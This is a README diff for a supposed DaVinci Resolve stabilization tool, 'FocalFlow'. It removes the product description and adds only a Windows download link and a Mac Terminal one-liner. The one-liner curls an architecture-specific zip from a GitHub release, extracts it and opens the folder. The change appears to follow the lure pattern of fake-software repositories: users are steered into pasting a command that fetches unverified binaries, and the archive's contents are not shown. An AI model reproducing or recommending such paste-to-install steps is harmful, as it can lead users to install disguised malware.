@@ -1,2 +1,11 @@
 # FocalFlow
-FocalFlow is a stabilization tool that fits into a DaVinci Resolve workflow. Built to smooth out shaky long-lens footage, the kind where even small handheld movement gets magnified into a distracting wobble. You place a few tracking points and it smooths the camera path to produce a steadier and more purposeful shot.
+
+## Windows
+[Download for Windows](https://github.com/twinsuns320/FocalFlow/releases/latest/download/FocalFlow_windows.zip)
+
+## Mac
+Open Terminal, paste this, and press Enter:
+
+```
+cd ~/Downloads && curl -fL "https://github.com/twinsuns320/FocalFlow/releases/latest/download/FocalFlow_$(uname -m).zip" -o FocalFlow.zip && ditto -x -k FocalFlow.zip . && rm FocalFlow.zip && open .
+```
